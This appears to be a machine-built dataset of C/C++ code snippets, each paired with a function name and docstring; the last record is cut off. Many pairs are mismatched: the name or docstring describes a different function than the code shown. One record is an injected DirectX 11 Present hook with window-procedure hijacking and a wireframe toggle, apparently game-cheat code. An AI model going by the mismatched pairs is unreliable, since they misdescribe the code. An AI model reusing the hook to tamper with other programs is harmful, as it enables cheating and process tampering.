{"content":"{'function_name': 'ISR', 'docstring': '\/\/ check every 5 seconds if it has recieved messages\\r', 'code': 'int main(void)\\r\\n{\\r\\n\\txgrid.rx_pkt = &rx_pkt;\\r\\n    \\r\\n\\t_delay_ms(50);\\r\\n    \\r\\n\\t\/\/ ========== INITIALIZATION ==========\\r\\n    init();\\t\\t\\t\\t\/\/for board\\r\\n\\tinit_servo();\\t\\t\/\/for servo\\r\\n\\tinit_variables();\\t\/\/for program\\r\\n    \\r\\n\\tfprintf_P(&usart_stream, PSTR(\"START (build number : %ld)\\\\r\\\\n\"), (unsigned long) &__BUILD_NUMBER);\\r\\n    \/\/printKeyCommands();\\r\\n    \\r\\n    srand(swarm_id);\\r\\n    randomPeriod = (18.0 * rand() \/ RAND_MAX)+ 2.0;\\r\\n    \\r\\n    \/\/ START ADC\\r\\n    \/\/\\r\\n    ADCA.CTRLA |= ADC_CH0START_bm;\\r\\n    ADCA.CH0.INTFLAGS = ADC_CH_CHIF_bm;\\r\\n    \\r\\n\\t\/\/ ===== Identification of Left Bottom Corner module =====\\r\\n\\t\/\/ Special module is necessary\\r\\n\\t\/\/ 1) as a pace maker in \"rhythm\" mode,\\r\\n\\t\/\/ 2) as a messanger of variable-reset signal\\r\\n\\ttemp_time = jiffies + 2000;\\r\\n\\twhile(jiffies < temp_time)\\r\\n\\t{\\r\\n\\t\\t\/\/ send dummy data\\r\\n\\t\\tif(sendmessage_fast)\\r\\n\\t\\t{\\r\\n\\t\\t\\tsend_message(MESSAGE_COMMAND, ALL_DIRECTION, ALL, \"@\");\\r\\n\\t\\t\\tsendmessage_fast = false;\\r\\n\\t\\t}\\r\\n\\t}\\r\\n    \\r\\n\\t\/\/ #################### Synchronize ####################\\r\\n    calib_switch = true;\\r\\n    calib_double_switch = true;\\r\\n    calib_times = 0;\\r\\n    calibinfo._calib_times = 0;\\r\\n    \\r\\n    if (swarm_id == _MAIN_BOARD)\\r\\n    {\\r\\n        _delay_ms(1000);\\r\\n        Calib();\\r\\n        special = true;\\r\\n    }\\r\\n    \\r\\n    \\r\\n    \/\/ #################### MAIN LOOP ####################\\r\\n\\r\\n\\twhile (1)\\r\\n\\t{\\r\\n\\t\\t\/\/ ========== REBOOT PROCESS ==========\\r\\n\\t\\tif(reboot_on)\\r\\n\\t\\t{\\r\\n\\t\\t\\ttemp_time = jiffies + 3000;\\r\\n\\t\\t\\twhile(jiffies < temp_time){LED_PORT.OUTTGL = LED_USR_1_PIN_bm; _delay_ms(100);}\\r\\n\\t\\t\\txboot_reset();\\r\\n\\t\\t}\\r\\n        \\r\\n\\t\\t\/\/ ========== KEY INPUT ==========\\r\\n\\t\\tkey_input();\\r\\n                \\r\\n        \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\\r\\n        \/\/ if angle is being updated this cycle\\r\\n        if(servo_motor_on)\\r\\n        {\\r\\n            servoBehavior();\\r\\n            lastMode = currentMode;\\r\\n            lastPresMode = presMode;\\r\\n            \\r\\n            \/\/ wait until updateRate has come back around\\r\\n            servo_motor_on = false;\\r\\n            \\r\\n        }\\r\\n        \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\\r\\n\\t}\\t\\r\\n\\treturn 0;\\r\\n}'}","id":5049}
{"content":"{'function_name': 'geometry_flat', 'docstring': '\/\/ 0', 'code': 'std::tuple<pwx_positions, double>\\ngeometry_buckled(const G& g, const std::string& atom_symbol)\\n{\\n  \/\/ n = number of atoms in unit cell:\\n  \/\/ a) n > 0: dz_n\\n  \/\/ b) n > 1: dz_n, rho_1, dz_1\\n  \/\/ c) n > 2: dz_n, rho_1, dz_1, (rho_i, phi_i, dz_i) for i = 2, ..., n - 1\\n  \/\/ Note: G::size() == 1 && n == 1 || g.size() == 3 * (n - 1) && n > 1\\n  using T = typename G::gene_t;\\n  std::size_t i = 0;\\n  const T dz_n = g.value(i++);\\n  T z = 0.;\\n  pwx_positions res{ pwx_position{ atom_symbol, 0., 0., z } }; \/\/ 0\\n  if (number_of_atoms<G>(false) > 1) {                         \/\/ 1\\n    const auto [x, y] = quile::polar2cart(g.value(i++), 0.);\\n    z += g.value(i++);\\n    res.push_back(pwx_position{ atom_symbol, x, y, z });\\n  }\\n  while (i < G::size()) { \/\/ 2, ..., n - 1\\n    const auto rho = g.value(i++);\\n    const auto [x, y] = quile::polar2cart(rho, g.value(i++));\\n    z += g.value(i++);\\n    res.push_back(pwx_position{ atom_symbol, x, y, z });\\n  }\\n  assert(i == g.size() && res.size() == number_of_atoms<G>(false));\\n  return std::tuple<pwx_positions, double>{ adjust_positions(res), z + dz_n };\\n}'}","id":5054}
{"content":"{'function_name': 'contain', 'docstring': '\/\/2 \u5185\u90e8 1 \u8fb9\u754c 0 \u5916\u90e8', 'code': 'vector<point> ConvexHull(vector<point>A,int flag=1){\\n\\t\/\/flag=0 \u4e0d\u4e25\u683c flag=1 \u4e25\u683c\\n\\tint n=A.size(); vector<point>ans(n*2);\\n\\tsort(A.begin(),A.end()); int now=-1;\\n\\tfor (int i=0;i<A.size();i++){\\n\\t\\twhile (now>0&&sign(cross(ans[now]-ans[now-1],A[i]-ans[now-1]))<flag) now--;\\n\\t\\tans[++now]=A[i];\\n\\t}\\n\\tint pre=now;\\n\\tfor (int i=n-2;i>=0;i--){\\n\\t\\twhile (now>pre&&sign(cross(ans[now]-ans[now-1],A[i]-ans[now-1]))<flag) now--;\\n\\t\\tans[++now]=A[i];\\n\\t}\\n\\tans.resize(now); return ans;\\n}'}","id":5057}
{"content":"{'function_name': 'p_gda_min_distthreshold', 'docstring': '\/\/ invoke the function', 'code': 'SEXP p_gda_queen_weights(SEXP xp_geoda, int order, bool include_lower_order, double precision_threshold)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDa\\n  Rcpp::XPtr<GeoDa> ptr(xp_geoda);\\n  GeoDa* geoda = static_cast<GeoDa*> (R_ExternalPtrAddr(ptr));\\n\\n  \/\/ invoke the function\\n  GeoDaWeight* w = gda_queen_weights(geoda, order, include_lower_order, precision_threshold);\\n\\n  Rcpp::XPtr<GeoDaWeight> w_ptr(w, true); \/\/ true: we need to register a delete finalizer with the external pointer.\\n\\n  return w_ptr;\\n}'}","id":5061}
{"content":"{'function_name': 'pci_when_pci_ready', 'docstring': '\/\/ Link node into chain', 'code': 'void pci_notify_pci_ready()\\n{\\n    assert(!pci_ready_already);\\n    if (pci_ready_already)\\n        return;\\n    \\n    \/\/ Walk the chain, reversing the order of the links on the way\\n    pci_ready_node_t *prev = nullptr;\\n    pci_ready_node_t *curr = pci_ready_node_first;\\n    \\n    \/\/ Reverse the order of the chain\\n    while (curr) {\\n        assert(curr->magic == curr->expected_magic);\\n        pci_ready_node_t *save_next = curr->next;\\n        curr->next = prev;\\n        prev = curr;\\n        curr = save_next;\\n    }\\n    curr = prev;\\n    \\n    \/\/ Execute the items in the order they were added\\n    while (curr) {\\n        assert(curr->magic == curr->expected_magic);\\n        curr->callback(curr->callback_arg);\\n        curr = curr->next;\\n    }\\n    \\n    pci_ready_already = true;\\n}'}","id":5064}
{"content":"{'function_name': 'printTreeCtrlPacketInfo', 'docstring': '\/* \u5efa\u7acb\u7f16\u53f7\u7ed3\u70b9 *\/', 'code': 'int printEthernet2TreeCtrl(const Packet &pkt, HTREEITEM &parentNode)\\n{\\n\\tif (pkt.isEmpty() || pkt.ethh == NULL || parentNode == NULL)\\n\\t{\\n\\t\\treturn -1;\\n\\t}\\n\\t\/* \u83b7\u53d6\u6e90\u76eeMAC\u5730\u5740 *\/\\n\\tCString strSrcMAC = MACAddr2CString(pkt.ethh->srcaddr);\\n\\tCString\\tstrDstMAC = MACAddr2CString(pkt.ethh->dstaddr);\\n\\tCString strEthType;\\n\\tstrEthType.Format(\"0x%04X\", ntohs(pkt.ethh->eth_type));\\n\\n\\tHTREEITEM\\tEthNode = g_pTreeCtrlPacketInfo->InsertItem( \"\u4ee5\u592a\u7f51\uff08\" + strSrcMAC + \" -> \" + strDstMAC + \"\uff09\", parentNode, 0);\\n\\n\\tg_pTreeCtrlPacketInfo->InsertItem(\"\u76ee\u7684MAC\u5730\u5740\uff1a\" + strDstMAC, EthNode, 0);\\n\\tg_pTreeCtrlPacketInfo->InsertItem(\"\u6e90MAC\u5730\u5740\uff1a\" + strSrcMAC, EthNode, 0);\\n\\tg_pTreeCtrlPacketInfo->InsertItem(\"\u7c7b\u578b\uff1a\" + strEthType, EthNode, 0);\\n\\n\\tif (pkt.iph != NULL)\\n\\t{\\n\\t\\tprintIP2TreeCtrl(pkt, parentNode);\\n\\t}\\n\\telse if (pkt.arph != NULL)\\n\\t{\\n\\t\\tprintARP2TreeCtrl(pkt, parentNode);\\n\\t}\\n\\treturn 0;\\n}'}","id":5072}
{"content":"{'function_name': 'IsLegalDirectFormatNameOperation', 'docstring': '\/\/\\r', 'code': \"HRESULT\\r\\nRtpOpenQueue(\\r\\n    IN LPCWSTR lpwcsFormatName,\\r\\n    IN DWORD dwDesiredAccess,\\r\\n    IN DWORD dwShareMode,\\r\\n    OUT DWORD* phQueue\\r\\n    )\\r\\n{\\r\\n    *phQueue = NULL ;\\r\\n    \/\/\\r\\n    \/\/ Check validity of access mode.\\r\\n    \/\/ 1. Check that only legal bits are turned on.\\r\\n    \/\/ 2. Check that only legal access combinations are used.\\r\\n    \/\/\\r\\n    if ((dwDesiredAccess & ~MQ_VALID_ACCESS) ||\\r\\n        !(dwDesiredAccess & MQ_VALID_ACCESS))\\r\\n\\r\\n    {\\r\\n       \/\/\\r\\n       \/\/ Ilegal bits are turned on.\\r\\n       \/\/\\r\\n       return MQ_ERROR_UNSUPPORTED_ACCESS_MODE ;\\r\\n    }\\r\\n    else if (dwDesiredAccess != MQ_SEND_ACCESS)\\r\\n    {\\r\\n       if (dwDesiredAccess & MQ_SEND_ACCESS)\\r\\n       {\\r\\n          \/\/\\r\\n          \/\/ A queue can't be open for both send and receive.\\r\\n          \/\/\\r\\n          return MQ_ERROR_UNSUPPORTED_ACCESS_MODE ;\\r\\n       }\\r\\n    }\\r\\n\\r\\n   if ((dwShareMode & MQ_DENY_RECEIVE_SHARE) &&\\r\\n       (dwDesiredAccess & MQ_SEND_ACCESS))\\r\\n   {\\r\\n       \/\/\\r\\n       \/\/ not supporting SEND_ACCESS with DENY_RECEIVE.\\r\\n       \/\/\\r\\n       return MQ_ERROR_UNSUPPORTED_ACCESS_MODE ;\\r\\n    }\\r\\n\\r\\n\\tif (dwDesiredAccess & MQ_SEND_ACCESS)\\r\\n    {\\r\\n       if (!g_pSecCntx)\\r\\n       {\\r\\n          InitSecurityContext();\\r\\n       }\\r\\n    }\\r\\n\\r\\n    AP<QUEUE_FORMAT> pMqf;\\r\\n    DWORD        nMqf;\\r\\n    CStringsToFree StringsToFree;\\r\\n    if (!FnMqfToQueueFormats(\\r\\n            lpwcsFormatName,\\r\\n            pMqf,\\r\\n            &nMqf,\\r\\n            StringsToFree\\r\\n            ))\\r\\n    {\\r\\n        LogHR(MQ_ERROR_ILLEGAL_FORMATNAME, s_FN, 40);\\r\\n        return MQ_ERROR_ILLEGAL_FORMATNAME;\\r\\n    }\\r\\n\\r\\n    ASSERT(nMqf > 0);\\r\\n\\r\\n    \/\/\\r\\n    \/\/ Multiple queues or DL can be opened for send only\\r\\n    \/\/\\r\\n    if ((dwDesiredAccess & MQ_SEND_ACCESS) == 0)\\r\\n    {\\r\\n        if (nMqf > 1 ||\\r\\n            pMqf[0].GetType() == QUEUE_FORMAT_TYPE_DL)\\r\\n        {\\r\\n            LogHR(MQ_ERROR_UNSUPPORTED_FORMATNAME_OPERATION, s_FN, 45);\\r\\n            return MQ_ERROR_UNSUPPORTED_FORMATNAME_OPERATION;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    ASSERT(tls_hBindRpc);\\r\\n    CMQHResult rc;\\r\\n    rc = R_QMOpenQueue(\\r\\n            tls_hBindRpc,\\r\\n            nMqf,\\r\\n            pMqf,\\r\\n            GetCurrentProcessId(),\\r\\n            dwDesiredAccess,\\r\\n            dwShareMode,\\r\\n            phQueue\\r\\n            );\\r\\n\\r\\n    return rc;\\r\\n}\"}","id":5094}
{"content":"{'function_name': 'Lp_space_Tfin_error_FEM', 'docstring': '\/\/std::cout<<\"The L^\"<<p<<\" error is \"<< pow (errorLp , 1.0\/p )<<std::endl;', 'code': 'T Lp_space_error_FEM( const Fonction& level_set_final , const Fonction& level_set_initial , const Mesh& msh , size_t degree , double p )\\n{\\n    \/\/ L^p in space ; l^q in time\\n    T errorLp = 0.;\\n    for(auto& cl : msh.cells)\\n    {\\n        auto qps = integrate(msh, cl, 2*degree + 2 ); \/\/ what orders?\\n            for (auto& qp : qps )\\n            {\\n                auto diff_val = std::abs( level_set_final( qp.first , msh , cl ) - level_set_initial( qp.first , msh , cl ) );\\n                errorLp += qp.second * pow(diff_val,p) ;\\n            }\\n        \/\/std::cout<<\"The L^2 error squared in cell \"<<offset(msh,cl)<<\" is \"<< errorL2 <<std::endl;\\n    }\\n    errorLp = pow( errorLp , 1.0\/ p );\\n    \/\/std::cout<<\"The L^2 error is \"<<sqrt( errorL2 )<<std::endl;\\n    return errorLp ;\\n}'}","id":5095}
{"content":"{'function_name': 'set_xenstore_grant', 'docstring': '\/* ... and share it with the other side via the xenstore. *\/', 'code': 'int main(int argc, char **argv)\\n{\\n    uint32_t gref;\\n\\n    \/* Open our XenStore connection. *\/\\n    xs = xs_daemon_open();\\n    if(!xs) {\\n        printf(\"Failed to talk to the XenStore!\");\\n    }\\n\\n    \/* Bring up our main logger... *\/\\n    logger = xtl_createlogger_stdiostream(stdin, XTL_ERROR, XTL_STDIOSTREAM_SHOW_DATE);\\n\\n    \/* Bring up the granting interface. *\/\\n    gntshr = xengntshr_open((xentoollog_logger *)logger, 0);\\n    if(!gntshr) {\\n        printf(\"Failed to open gntshr!\\\\n\");\\n        int result = Catch::Session().run( argc, argv );\\n        exit(-1);\\n    }\\n\\n    \/* Grant out a page to the other side... *\/\\n    gref = grant_out_page(TEST_HOST_DOMID, &mapping);\\n    data_buffer = mapping + 2;\\n\\n    \/* ... and share that page\\'s grant reference. *\/\\n    set_xenstore_grant(gref);\\n\\n    \/* Run the core unit tests. *\/\\n    int result = Catch::Session().run( argc, argv );\\n\\n    \/* Bring down the granting interface. *\/\\n    xengntshr_close(gntshr);\\n\\n    return result;\\n}'}","id":5100}
{"content":"{'function_name': 'applyMinMaxDatetime', 'docstring': '\/\/ Apply mask min\/max', 'code': 'std::vector<bool> processWhere(const eckit::Configuration & config,\\n                               const ObsFilterData & filterdata) {\\n  const size_t nlocs = filterdata.nlocs();\\n\\n\/\/ Everywhere by default if no mask\\n  std::vector<bool> where(nlocs, true);\\n\\n  std::vector<eckit::LocalConfiguration> masks;\\n  config.get(\"where\", masks);\\n\\n  for (size_t jm = 0; jm < masks.size(); ++jm) {\\n    eckit::LocalConfiguration varconf(masks[jm], \"variable\");\\n    Variable var(varconf);\\n    for (size_t jvar = 0; jvar < var.size(); ++jvar) {\\n      if (var.group() != \"VarMetaData\") {\\n        const Variable varname = var[jvar];\\n        ioda::ObsDtype dtype = filterdata.dtype(varname);\\n\\n        if (dtype == ioda::ObsDtype::DateTime) {\\n          applyMinMaxDatetime(where, masks[jm], filterdata, varname);\\n        } else {\\n          applyMinMaxFloat(where, masks[jm], filterdata, varname);\\n        }\\n\\n\/\/      Apply mask is_defined\\n        if (masks[jm].has(\"is_defined\")) {\\n          if (filterdata.has(varname)) {\\n            std::vector<float> data;\\n            filterdata.get(varname, data);\\n            processWhereIsDefined(data, where);\\n          } else {\\n            std::fill(where.begin(), where.end(), false);\\n          }\\n        }\\n\\n\/\/      Apply mask is_not_defined\\n        if (masks[jm].has(\"is_not_defined\")) {\\n          std::vector<float> data;\\n          filterdata.get(varname, data);\\n          processWhereIsNotDefined(data, where);\\n        }\\n\\n\/\/      Apply mask is_in\\n        if (masks[jm].has(\"is_in\")) {\\n          if (dtype == ioda::ObsDtype::String) {\\n            isInString(where, masks[jm], filterdata, varname);\\n          } else if (dtype == ioda::ObsDtype::Integer) {\\n            isInInteger(where, masks[jm], filterdata, varname);\\n          } else {\\n            throw eckit::UserError(\\n              \"Only integer and string variables may be used for processWhere \\'is_in\\'\",\\n              Here());\\n          }\\n        }\\n\\n\/\/      Apply mask is_not_in\\n        if (masks[jm].has(\"is_not_in\")) {\\n          if (dtype == ioda::ObsDtype::String) {\\n            isNotInString(where, masks[jm], filterdata, varname);\\n          } else if (dtype == ioda::ObsDtype::Integer) {\\n            isNotInInteger(where, masks[jm], filterdata, varname);\\n          } else {\\n            throw eckit::UserError(\\n              \"Only integer and string variables may be used for processWhere \\'is_not_in\\'\",\\n              Here());\\n          }\\n        }\\n\\n\/\/      Apply mask any_bit_set_of\\n        if (masks[jm].has(\"any_bit_set_of\")) {\\n          if (dtype == ioda::ObsDtype::Integer) {\\n            std::vector<int> data;\\n            std::set<int> flags = oops::parseIntSet(masks[jm].getString(\"any_bit_set_of\"));\\n            filterdata.get(varname, data);\\n            processWhereBitSet(data, flags, where);\\n          } else {\\n            throw eckit::UserError(\\n              \"Only integer variables may be used for processWhere \\'any_bit_set_of\\'\",\\n              Here());\\n          }\\n        }\\n      }\\n    }\\n  }\\n\/\/  Print diagnostics for debug\\n  int ii = 0;\\n  for (size_t jj = 0; jj < nlocs; ++jj) {\\n    if (where[jj] == false) ++ii;\\n  }\\n\\n  oops::Log::debug() << \"processWhere: selected \" << ii << \" obs.\" << std::endl;\\n  return where;\\n}'}","id":5102}
{"content":"{'function_name': 'main', 'docstring': '\/\/ \u6b64\u65f6\u6709\u4e24\u79cd\u5904\u7406\u65b9\u5f0f\uff1a1. \u7528\u6237\u81ea\u5df1\u6765\u5f3a\u5236\u8f6c\u5316 2. \u4f7f\u7528\u663e\u5f0f\u5b9e\u4f8b\u5316    ', 'code': 'int main() {\\n\\tint a1 = 10, a2 = 20;\\n\\tdouble d1 = 10.0, d2 = 20.0;\\n\\tAdd<int>(a1, d1); \/\/\u663e\u5f0f\u5b9e\u4f8b\u5316\\n\\t\/\/\u5982\u679c\u7c7b\u578b\u4e0d\u5339\u914d\uff0c\u7f16\u8bd1\u5668\u4f1a\u5c1d\u8bd5\u8fdb\u884c\u9690\u5f0f\u7c7b\u578b\u8f6c\u6362\uff0c\u5982\u679c\u65e0\u6cd5\u8f6c\u6362\u6210\u529f\u7f16\u8bd1\u5668\u5c06\u4f1a\u62a5\u9519\\n\\treturn 0;\\n}'}","id":5110}
{"content":"{'function_name': 'TEST_F', 'docstring': '\/\/ not set.', 'code': 'TEST_F(URLRequestTestHTTP, TestTagging) {\\n  if (!CanGetTaggedBytes()) {\\n    DVLOG(0) << \"Skipping test - GetTaggedBytes unsupported.\";\\n    return;\\n  }\\n\\n  ASSERT_TRUE(http_test_server()->Start());\\n\\n  \/\/ The tag under which the system reports untagged traffic.\\n  static const int32_t UNTAGGED_TAG = 0;\\n\\n  uint64_t old_traffic = GetTaggedBytes(UNTAGGED_TAG);\\n\\n  \/\/ Untagged traffic should be tagged with tag UNTAGGED_TAG.\\n  TestDelegate delegate;\\n  std::unique_ptr<URLRequest> req(default_context().CreateRequest(\\n      http_test_server()->GetURL(\"\/\"), DEFAULT_PRIORITY, &delegate,\\n      TRAFFIC_ANNOTATION_FOR_TESTS));\\n  EXPECT_EQ(SocketTag(), req->socket_tag());\\n  req->Start();\\n  delegate.RunUntilComplete();\\n\\n  EXPECT_GT(GetTaggedBytes(UNTAGGED_TAG), old_traffic);\\n\\n  int32_t tag_val1 = 0x12345678;\\n  SocketTag tag1(SocketTag::UNSET_UID, tag_val1);\\n  old_traffic = GetTaggedBytes(tag_val1);\\n\\n  \/\/ Test specific tag value.\\n  req = default_context().CreateRequest(http_test_server()->GetURL(\"\/\"),\\n                                        DEFAULT_PRIORITY, &delegate,\\n                                        TRAFFIC_ANNOTATION_FOR_TESTS);\\n  req->set_socket_tag(tag1);\\n  EXPECT_EQ(tag1, req->socket_tag());\\n  req->Start();\\n  delegate.RunUntilComplete();\\n\\n  EXPECT_GT(GetTaggedBytes(tag_val1), old_traffic);\\n}'}","id":5111}
{"content":"{'function_name': 'main_menu', 'docstring': '\/\/}', 'code': 'HRESULT __fastcall Present(IDXGISwapChain* p_chain, UINT sync_interval, UINT flags)\\n{\\n\\tif (!ui::hooking::g_b_initialized) {\\n\\t\\tif (FAILED(get_device_and_ctx_from_swapchain(p_chain, &p_device, &p_context)))\\n\\t\\t\\treturn fn_idxgi_swap_chain_present(p_chain, sync_interval, flags);\\n\\t\\tp_swap_chain = p_chain;\\n\\t\\tDXGI_SWAP_CHAIN_DESC sd;\\n\\t\\tp_chain->GetDesc(&sd);\\n\\n\\t\\tImGui::CreateContext();\\n\\t\\tImGuiIO& io = ImGui::GetIO(); (void)io;\\n\\t\\tio.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard | ImGuiConfigFlags_NavEnableSetMousePos | ImGuiConfigFlags_NavEnableGamepad;\\n\\t\\t\/\/ Not needed right now.\\n\\n\\t\\t\/\/ Style\\n\\t\\tImGuiStyle& style = ImGui::GetStyle();\\n\\t\\tstyle.WindowTitleAlign = ImVec2(0.5f, 0.5f);\\n\\t\\tstyle.WindowMenuButtonPosition = ImGuiDir_None;\\n\\n\\t\\tImVec4* colors = ImGui::GetStyle().Colors;\\n\\t\\tcolors[ImGuiCol_WindowBg] = ImVec4(0.10f, 0.00f, 0.00f, 0.94f);\\n\\t\\tcolors[ImGuiCol_PopupBg] = ImVec4(0.15f, 0.00f, 0.00f, 0.94f);\\n\\t\\tcolors[ImGuiCol_Border] = ImVec4(0.34f, 0.00f, 0.00f, 0.50f);\\n\\t\\tcolors[ImGuiCol_FrameBg] = ImVec4(0.19f, 0.00f, 0.00f, 0.54f);\\n\\t\\tcolors[ImGuiCol_FrameBgHovered] = ImVec4(1.00f, 0.00f, 0.00f, 0.40f);\\n\\t\\tcolors[ImGuiCol_FrameBgActive] = ImVec4(1.00f, 0.00f, 0.00f, 0.67f);\\n\\t\\tcolors[ImGuiCol_TitleBg] = ImVec4(0.55f, 0.00f, 0.00f, 1.00f);\\n\\t\\tcolors[ImGuiCol_TitleBgActive] = ImVec4(0.67f, 0.00f, 0.00f, 1.00f);\\n\\t\\tcolors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.42f, 0.00f, 0.00f, 0.51f);\\n\\t\\tcolors[ImGuiCol_MenuBarBg] = ImVec4(0.34f, 0.00f, 0.00f, 1.00f);\\n\\t\\tcolors[ImGuiCol_ScrollbarBg] = ImVec4(0.18f, 0.00f, 0.00f, 0.53f);\\n\\t\\tcolors[ImGuiCol_ScrollbarGrab] = ImVec4(0.44f, 0.00f, 0.00f, 1.00f);\\n\\t\\tcolors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.66f, 0.00f, 0.00f, 1.00f);\\n\\t\\tcolors[ImGuiCol_ScrollbarGrabActive] = ImVec4(1.00f, 0.00f, 0.00f, 1.00f);\\n\\t\\tcolors[ImGuiCol_CheckMark] = ImVec4(1.00f, 0.00f, 0.00f, 1.00f);\\n\\t\\tcolors[ImGuiCol_SliderGrab] = ImVec4(0.88f, 0.24f, 0.24f, 1.00f);\\n\\t\\tcolors[ImGuiCol_SliderGrabActive] = ImVec4(0.98f, 0.26f, 0.26f, 1.00f);\\n\\t\\tcolors[ImGuiCol_Button] = ImVec4(0.98f, 0.26f, 0.26f, 0.40f);\\n\\t\\tcolors[ImGuiCol_ButtonHovered] = ImVec4(0.98f, 0.26f, 0.26f, 1.00f);\\n\\t\\tcolors[ImGuiCol_ButtonActive] = ImVec4(0.98f, 0.06f, 0.06f, 1.00f);\\n\\t\\tcolors[ImGuiCol_Header] = ImVec4(0.98f, 0.26f, 0.26f, 0.31f);\\n\\t\\tcolors[ImGuiCol_HeaderHovered] = ImVec4(0.98f, 0.26f, 0.26f, 0.80f);\\n\\t\\tcolors[ImGuiCol_HeaderActive] = ImVec4(0.98f, 0.26f, 0.26f, 1.00f);\\n\\t\\tcolors[ImGuiCol_Separator] = ImVec4(0.50f, 0.43f, 0.43f, 0.50f);\\n\\t\\tcolors[ImGuiCol_SeparatorHovered] = ImVec4(0.75f, 0.10f, 0.10f, 0.78f);\\n\\t\\tcolors[ImGuiCol_SeparatorActive] = ImVec4(0.75f, 0.10f, 0.10f, 1.00f);\\n\\t\\tcolors[ImGuiCol_ResizeGrip] = ImVec4(0.98f, 0.26f, 0.26f, 0.20f);\\n\\t\\tcolors[ImGuiCol_ResizeGripHovered] = ImVec4(0.98f, 0.26f, 0.26f, 0.67f);\\n\\t\\tcolors[ImGuiCol_ResizeGripActive] = ImVec4(0.98f, 0.26f, 0.26f, 0.95f);\\n\\t\\tcolors[ImGuiCol_Tab] = ImVec4(0.58f, 0.18f, 0.18f, 0.86f);\\n\\t\\tcolors[ImGuiCol_TabHovered] = ImVec4(0.98f, 0.26f, 0.26f, 0.80f);\\n\\t\\tcolors[ImGuiCol_TabActive] = ImVec4(0.68f, 0.20f, 0.20f, 1.00f);\\n\\t\\tcolors[ImGuiCol_TabUnfocused] = ImVec4(0.15f, 0.07f, 0.07f, 0.97f);\\n\\t\\tcolors[ImGuiCol_TabUnfocusedActive] = ImVec4(0.42f, 0.14f, 0.14f, 1.00f);\\n\\t\\tcolors[ImGuiCol_TableHeaderBg] = ImVec4(0.20f, 0.19f, 0.19f, 1.00f);\\n\\t\\tcolors[ImGuiCol_TableBorderStrong] = ImVec4(0.35f, 0.31f, 0.31f, 1.00f);\\n\\t\\tcolors[ImGuiCol_TableBorderLight] = ImVec4(0.25f, 0.23f, 0.23f, 1.00f);\\n\\t\\tcolors[ImGuiCol_TextSelectedBg] = ImVec4(0.98f, 0.26f, 0.26f, 0.35f);\\n\\t\\tcolors[ImGuiCol_NavHighlight] = ImVec4(0.98f, 0.26f, 0.26f, 1.00f);\\n\\n\\t\\t\/\/ Get path of dll and save imgui config there.\\n\\t\\tstd::string imgui_config_path = utils::locations::get_current_working_dir();\\n\\t\\timgui_config_path.append(\"\\\\\\\\ui.ini\");\\n\\t\\tio.IniFilename = imgui_config_path.c_str();\\n\\n\\t\\twindow = sd.OutputWindow;\\n\\n\\t\\t\/\/Set OriginalWndProcHandler to the Address of the Original WndProc function\\n\\t\\toriginal_wnd_proc_handler = reinterpret_cast<WNDPROC>(SetWindowLongPtr(window, GWLP_WNDPROC, reinterpret_cast<LONG_PTR>(h_wnd_proc)));\\n\\n\\t\\tImGui_ImplWin32_Init(window);\\n\\t\\tImGui_ImplDX11_Init(p_device, p_context);\\n\\t\\tImGui::GetIO().ImeWindowHandle = window;\\n\\n\\t\\tImGui_ImplDX11_InvalidateDeviceObjects();\\n\\n\\t\\twireframe_mode(true);\\n\\n\\t\\tID3D11Texture2D* p_back_buffer;\\n\\n\\t\\tp_chain->GetBuffer(0, __uuidof(ID3D11Texture2D), reinterpret_cast<LPVOID*>(&p_back_buffer));\\n\\t\\tp_device->CreateRenderTargetView(p_back_buffer, nullptr, &main_render_target_view);\\n\\t\\tp_back_buffer->Release();\\n\\n\\t\\tui::hooking::g_b_initialized = true;\\n\\t}\\n\\n\\tImGui_ImplWin32_NewFrame();\\n\\tImGui_ImplDX11_NewFrame();\\n\\n\\tImGui::NewFrame();\\n\\t\/\/\\n\\t\/\/Menu is displayed when g_ShowMenu is TRUE\\n\\tif (g_show_menu)\\n\\t{\\n\\t\\tmain_menu();\\n\\t}\\n\\n\\tImGui::EndFrame();\\n\\n\\tImGui::Render();\\n\\n\\tp_context->OMSetRenderTargets(1, &main_render_target_view, nullptr);\\n\\n\\tImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());\\n\\n\\treturn fn_idxgi_swap_chain_present(p_chain, sync_interval, flags);\\n}'}","id":5119}
{"content":"{'function_name': 'VkToPalSrcPipePoints', 'docstring': '\/\/ Go through each mapping and add the corresponding pipe point to the array if needed', 'code': 'inline Pal::HwPipePoint VkToPalWaitPipePoint(PipelineStageFlags flags)\\n{\\n    static_assert((Pal::HwPipePostPrefetch == Pal::HwPipePreCs) && (Pal::HwPipePostPrefetch == Pal::HwPipePreBlt),\\n        \"The code here assumes pre-CS and pre-blit match post-index-fetch.\");\\n\\n    \/\/ Flags that only require waiting bottom-of-pipe.\\n    static const PipelineStageFlags dstBottomOfPipeFlags =\\n        VK_PIPELINE_STAGE_HOST_BIT                              |\\n        VK_PIPELINE_STAGE_BOTTOM_OF_PIPE_BIT;\\n\\n    \/\/ Flags that only require waiting pre-rasterization.\\n    static const PipelineStageFlags dstPreRasterizationFlags =\\n        dstBottomOfPipeFlags                                    |\\n        VK_PIPELINE_STAGE_EARLY_FRAGMENT_TESTS_BIT              |\\n        VK_PIPELINE_STAGE_FRAGMENT_SHADER_BIT                   |\\n        VK_PIPELINE_STAGE_LATE_FRAGMENT_TESTS_BIT               |\\n        VK_PIPELINE_STAGE_COLOR_ATTACHMENT_OUTPUT_BIT           |\\n        VK_PIPELINE_STAGE_FRAGMENT_SHADING_RATE_ATTACHMENT_BIT_KHR;\\n\\n    \/\/ Flags that only require waiting post-index-fetch.\\n    static const PipelineStageFlags dstPostIndexFetchFlags =\\n        dstPreRasterizationFlags                                |\\n        VK_PIPELINE_STAGE_VERTEX_SHADER_BIT                     |\\n        VK_PIPELINE_STAGE_TESSELLATION_CONTROL_SHADER_BIT       |\\n        VK_PIPELINE_STAGE_TESSELLATION_EVALUATION_SHADER_BIT    |\\n        